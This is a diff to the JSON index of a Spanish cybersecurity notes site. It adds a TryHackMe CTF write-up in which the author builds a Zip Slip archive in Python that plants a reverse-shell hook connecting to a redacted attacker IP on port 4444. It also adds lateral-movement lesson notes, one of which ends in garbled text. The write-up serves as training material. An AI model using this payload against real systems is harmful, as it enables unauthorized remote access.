@@ -268,8 +268,8 @@
     "path": "/apuntes/thm/maquinas/2-medium/2-medium/",
     "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/2. Medium.md",
     "breadcrumb": "THM > Maquinas > 2. Medium",
-    "content": "1. [[0. Mr. Robot CTF]]\n2. [[Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/0. Net Sec Challenge]]\n3. [[0. Revenge]]\n4. [[0. Rabbit Store]]\n5. [[0. Ultra Tech]]\n6. [[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/0. Hammer]]\n7. [[Ciberseguridad/THM/Maquinas/2. Medium/7. Include/0. Include]]\n8. [[Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/0. Injectics]]\n9. [[Ciberseguridad/THM/Maquinas/2. Medium/9. Whats Your Name/0. Whats Your Name]]\n10. [[Ciberseguridad/THM/Maquinas/2. Medium/10. CAPTCHApocalypse/0. CAPTCHApocalypse]]\n11. [[Ciberseguridad/THM/Maquinas/2. Medium/11. Voyage/0. Voyage]]\n12. [[Ciberseguridad/THM/Maquinas/2. Medium/12. Sequence/0. Sequence]]\n13. [[0. Wonderland]]\n14. [[Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/0. Padelify]]\n15. [[Ciberseguridad/THM/Maquinas/2. Medium/15. Farewell/0. Farewell]]\n16. [[Ciberseguridad/THM/Maquinas/2. Medium/16. Juicy/0. Juicy]]\n17. [[0. GoldenEye]]\n18. [[0. Relevant]]\n19. [[0. Dogcat]]\n20. [[0. Wekor]]\n21. [[0. Fools Mate Revenge]]\n22. [[0. Blog]]\n23.",
-    "modified": "2026-07-24T01:28:11"
+    "content": "1. [[0. Mr. Robot CTF]]\n2. [[Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/0. Net Sec Challenge]]\n3. [[0. Revenge]]\n4. [[0. Rabbit Store]]\n5. [[0. Ultra Tech]]\n6. [[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/0. Hammer]]\n7. [[Ciberseguridad/THM/Maquinas/2. Medium/7. Include/0. Include]]\n8. [[Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/0. Injectics]]\n9. [[Ciberseguridad/THM/Maquinas/2. Medium/9. Whats Your Name/0. Whats Your Name]]\n10. [[Ciberseguridad/THM/Maquinas/2. Medium/10. CAPTCHApocalypse/0. CAPTCHApocalypse]]\n11. [[Ciberseguridad/THM/Maquinas/2. Medium/11. Voyage/0. Voyage]]\n12. [[Ciberseguridad/THM/Maquinas/2. Medium/12. Sequence/0. Sequence]]\n13. [[0. Wonderland]]\n14. [[Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/0. Padelify]]\n15. [[Ciberseguridad/THM/Maquinas/2. Medium/15. Farewell/0. Farewell]]\n16. [[Ciberseguridad/THM/Maquinas/2. Medium/16. Juicy/0. Juicy]]\n17. [[0. GoldenEye]]\n18. [[0. Relevant]]\n19. [[0. Dogcat]]\n20. [[0. Wekor]]\n21. [[0. Fools Mate Revenge]]\n22. [[0. Blog]]\n23. [[0. The Hollow Shell]]\n24.",
+    "modified": "2026-08-24T00:35:19"
   },
   {
     "title": "2. Getting the Flags",
@@ -2344,6 +2344,30 @@
     "modified": "2026-01-18T00:59:42"
   },
   {
+    "title": "0. The Hollow Shell",
+    "path": "/apuntes/thm/maquinas/2-medium/23-the-hollow-shell/0-the-hollow-shell/",
+    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/23. The Hollow Shell/0. The Hollow Shell.md",
+    "breadcrumb": "THM > Maquinas > 2. Medium > 23. The Hollow Shell",
+    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/23. The Hollow Shell/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/2. Medium/23. The Hollow Shell/2. Getting the Flags]]",
+    "modified": "2026-08-24T00:35:19"
+  },
+  {
+    "title": "2. Getting the Flags",
+    "path": "/apuntes/thm/maquinas/2-medium/23-the-hollow-shell/2-getting-the-flags/",
+    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/23. The Hollow Shell/2. Getting the Flags.md",
+    "breadcrumb": "THM > Maquinas > 2. Medium > 23. The Hollow Shell",
+    "content": "<h2>Reconocimiento Inicial</h2>\nComenzamos realizando un escaneo de puertos abiertos.\n\n![[Pasted image 20260823205533.png]]\n\nAhora vamos a escanear los puertos abiertos más en profundidad.\n\n![[Pasted image 20260823205409.png]]\n\nVamos a ver qué hay en la web.\n\n![[Pasted image 20260823205643.png]]\n\nVemos dos endpoints muy interesantes. Vamos a ver cómo se ve la web.\n\n![[Pasted image 20260823205723.png]]\n\n-----------------------------------\n<h2>Profundización</h2>\nSi miramos el código fuente podemos encontrar usuario y contraseña.\n\n![[Pasted image 20260823205812.png]]\n\nVamos a probar con dicho par para intentar obtener acceso al endpoint `/upload`, que es el más jugoso aparentemente.\n\n![[Pasted image 20260823205945.png]]\n\nHemos entrado al panel donde aparece el endpoint de subida. Vamos a investigar si hay algún tipo de filtro. Si intentamos subir un archivo `.php` nos dice lo siguiente.\n\n![[Pasted image 20260823210439.png]]\n\nVamos a crear un archivo `.zip` de prueba para ver cómo funciona la subida.\n\n![[Pasted image 20260823211427.png]]\n\nAhora probamos a subirlo.\n\n![[Pasted image 20260823211509.png]]\n\nEl mensaje ha cambiado. Vamos a la dirección que nos han dado.\n\n![[Pasted image 20260823211752.png]]\n\nAquí está.\n\n---------------------------------\n<h2>Explotación</h2>\nSabemos que está guardando las shells en un directorio `/shells/shell-id/`. Por lo que podemos inferir que los hooks se están guardando de forma similar. Hay un tipo de ataque llamado `Zip Slip` que nos permite guardar un nombre con `../../` y estos serán interpretados al descomprimirse.\n\nVamos a crear un exploit en python que nos devuelva el archivo `.zip` listo para subir.\n\n```python\nimport zipfile, json\n\npayload = ('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[REDACTED]\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")')\n\nwith zipfile.ZipFile(\"evil.zip\", \"w\") as z:\n    z.writestr(\"shell.json\", json.dumps({\"name\": \"evil\", \"assets\": [\"style.css\"]}))\n    z.writestr(\"style.css\", \"/* test */\")\n    z.writestr(\"../../hooks/evil.py\", payload)\n\n```\n\nAhora lo ejecutamos. Y esto nos da el zip para subir. Nos ponemos en escucha:\n\n![[Pasted image 20260823214848.png]]\n\nY ahora subimos el archivo.\n\n![[Pasted image 20260823214920.png]]\n\nUna vez que el worker llega a los hooks, podemos ver que nos devuelve una shell.\n\n![[Pasted image 20260823214944.png]]\n\nY una vez allí buscamos la flag.\n\n![[Pasted image 20260823215133.png]]",
+    "modified": "2026-08-24T00:35:19"
+  },
+  {
+    "title": "1. Introduction",
+    "path": "/apuntes/thm/maquinas/2-medium/23-the-hollow-shell/1-introduction/",
+    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/23. The Hollow Shell/1. Introduction.md",
+    "breadcrumb": "THM > Maquinas > 2. Medium > 23. The Hollow Shell",
+    "content": "![[Pasted image 20260823204542.png]]\n\nLa encuentras en la playa: bonita, normal, el tipo de cosa en la que nadie se fija y comprueba. Mete algo dentro y sostenlo junto a tu oído.",
+    "modified": "2026-08-24T00:35:19"
+  },
+  {
     "title": "2. Getting the Flags",
     "path": "/apuntes/thm/maquinas/2-medium/16-juicy/2-getting-the-flags/",
     "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/16. Juicy/2. Getting the Flags.md",
@@ -2880,76 +2904,68 @@
     "modified": "2026-07-06T02:01:06"
   },
   {
-    "title": "3. Spawning Processes Remotely",
-    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/3-spawning-processes-remotely/",
-    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/3. Spawning Processes Remotely.md",
+    "title": "7. Conclusion",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/7-conclusion/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/7. Conclusion.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 5. Red Teaming > 6. Compromising Active Directory > 4. Lateral Movement and Pivoting",
     "content": "",
-    "modified": "2026-04-29T01:52:26"
+    "modified": "2026-08-24T00:35:19"
   },
   {
-    "title": "8. Conclusion",
-    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/8-conclusion/",
-    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/8. Conclusion.md",
+    "title": "3. Moving Laterally Using WMI",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/3-moving-laterally-using-wmi/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/3. Moving Laterally Using WMI.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 5. Red Teaming > 6. Compromising Active Directory > 4. Lateral Movement and Pivoting",
     "content": "",
-    "modified": "2026-04-29T01:52:26"
+    "modified": "2026-08-24T00:35:19"
   },
   {
-    "title": "7. Port Forwarding",
-    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/7-port-forwarding/",
-    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/7. Port Forwarding.md",
+    "title": "4. Use of Alternate Authentication Material",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/4-use-of-alternate-authentication-material/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/4. Use of Alternate Authentication Material.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 5. Red Teaming > 6. Compromising Active Directory > 4. Lateral Movement and Pivoting",
     "content": "",
-    "modified": "2026-04-29T01:52:26"
-  },
-  {
-    "title": "6. Abusing User Behaviour",
-    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/6-abusing-user-behaviour/",
-    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/6. Abusing User Behaviour.md",
-    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 5. Red Teaming > 6. Compromising Active Directory > 4. Lateral Movement and Pivoting",
-    "content": "",
-    "modified": "2026-04-29T01:52:26"
+    "modified": "2026-08-24T00:35:19"
   },
   {
     "title": "0. Lateral Movement and Pivoting",
     "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/0-lateral-movement-and-pivoting/",
     "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/0. Lateral Movement and Pivoting.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 5. Red Teaming > 6. Compromising Active Directory > 4. Lateral Movement and Pivoting",
-    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/1. Introduction]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/2. Moving Through the Network]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/3. Spawning Processes Remotely]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/4. Moving Laterally Using WMI]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/5. Use of Alternate Authentication Material]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/6. Abusing User Behaviour]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/7. Port Forwarding]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/8. Conclusion]]",
-    "modified": "2026-04-29T01:52:26"
+    "content": "[[1. Moving Through the Network]]\n[[2. Spawning Processes Remotely]]\n[[3. Moving Laterally Using WMI]]\n[[4. Use of Alternate Authentication Material]]\n[[5. Abusing User Behaviour]]\n[[6. Port Forwarding]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/7. Conclusion]]",
+    "modified": "2026-08-24T00:35:19"
   },
   {
-    "title": "1. Introduction",
-    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/1-introduction/",
-    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/1. Introduction.md",
+    "title": "5. Abusing User Behaviour",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/5-abusing-user-behaviour/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/5. Abusing User Behaviour.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 5. Red Teaming > 6. Compromising Active Directory > 4. Lateral Movement and Pivoting",
     "content": "",
-    "modified": "2026-04-29T01:52:26"
+    "modified": "2026-08-24T00:35:19"
   },
   {
-    "title": "5. Use of Alternate Authentication Material",
-    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/5-use-of-alternate-authentication-material/",
-    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/5. Use of Alternate Authentication Material.md",
+    "title": "1. Moving Through the Network",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/1-moving-through-the-network/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/1. Moving Through the Network.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 5. Red Teaming > 6. Compromising Active Directory > 4. Lateral Movement and Pivoting",
-    "content": "",
-    "modified": "2026-04-29T01:52:26"
+    "content": "<h2>¿Qué es el Movimiento Lateral?</h2>\nPuesto de manera simple, el movimiento lateral es el grupo de técnicas usadas por los atacantes para moverse en una red. Una vez que el atacante ha ganado acceso a la primera máquina de la red, moverse es esencial por muchas razones, incluyendo:\n\n- Conseguir nuestros objetivos como atacantes.\n- Bypassear las restricciones de red existentes.\n- Establecer puntos adicionales de entrada a la red.\n- Crear confusión y evitar detección.\n\nMientras que muchas cadenas referencian movimiento lateral como un paso adicional en un proceso linear, es realmente parte de un ciclo. Durante este ciclo, usamos cualquier credencial disponible para realizar movimiento lateral, dándonos acceso a nuevas máquinas donde elevamos privilegios y extraemos credenciales si es posible. Con las nuevas credenciales, el ciclo comienza de nuevo.\n\n![[Pasted image 20260810133126.png]]\n\nNormalmente repetiremos el ciclo varias veces antes de alcanzar nuestro objetivo final. Si la primera máquina a la que accedemos es una máquina con muy poco acceso a recursos, puede que debamos movernos lateralmente hacia otros hosts que tengan más privilegios.\n\n-----------------------------------------\n<h2>Un Ejemplo Rápido</h2>\nSupón que estamos realizando un engagement de red team donde nuestro objetivo final es alcanzar el código interno de un repositorio, donde obtuvimos nuestro primer compromiso en la erd objetivo usando una campaña de phishing. Normalmente, las campañas de phishing son más efectivas contra usuarios no técnicos, por lo que nuestro primer acceso puede ser una máquina en el departamento de marketing.\n\nLas estaciones de trabjo de marketing normalmente estarán limitadas a través de políticas de firewall par ano acceder a ningún servicio crítico en la red, incluyendo protocolos administrativos, puertos de bases de datos, servicios de monitorización, etc.\n\nPara llegar a hosts y servicios sensibles, necesitamos movernos a otros hosts y pivotar desde ahí hacia nuestro objetivo final. Podríamos tratar de elevar privilegios de la estación de trabajo de Marketing y extraer los hashes de las contraseñas de usuarios locales. Si encontramos un administrador local, la misma cuenta puede estar presente en otros hosts. Después de hacer reconocimiento, encontramos una estación de trabajo con el nombre `DEV-0001-PC`. Podemos usar la contraseña del administrador local para acceder a `DEV-001-PC` y confirmar si pertenece a uno de los desarrolladores de la compañía. Desde ahí, el acceso al código objetivo está disponible.\n\n![[Pasted image 20260810134537.png]]\n\nTen en cuenta que aunque el movimiento lateral necesita ser usado para circunvalar restricciones de firewall, es también útil para evadir la detección. En nuestro ejemplo, incluso si la estación de Marketing tiene acceso directo al repositorio, es probablemente deseable coonectar a través del PC del desarrollador. Este comportamiento sería menos sospechoso desde el punto de vista de un blue teamer.\n\n------------------------------------------------\n<h2>La Perspectiva del Atacante</h2>\nHay varias maneras en las que un atacante puede moverse lateralmente. La forma más simple sería usar protocolos administrativos estandar como WinRM, RDP, VNC o SSH para conectarse a otras máquinas de mmmmá´",
+    "modified": "2026-08-24T00:35:19"
   },
   {
-    "title": "2. Moving Through the Network",
-    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/2-moving-through-the-network/",
-    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/2. Moving Through the Network.md",
+    "title": "6. Port Forwarding",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/6-port-forwarding/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/6. Port Forwarding.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 5. Red Teaming > 6. Compromising Active Directory > 4. Lateral Movement and Pivoting",
     "content": "",
-    "modified": "2026-04-29T01:52:26"
+    "modified": "2026-08-24T00:35:19"
   },
   {
-    "title": "4. Moving Laterally Using WMI",
-    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/4-moving-laterally-using-wmi/",
-    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/4. Moving Laterally Using WMI.md",
+    "title": "2. Spawning Processes Remotely",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/2-spawning-processes-remotely/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/2. Spawning Processes Remotely.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 5. Red Teaming > 6. Compromising Active Directory > 4. Lateral Movement and Pivoting",
     "content": "",
-    "modified": "2026-04-29T01:52:26"
+    "modified": "2026-08-24T00:35:19"
   },
   {
     "title": "1. Introduction to AD Breaches",
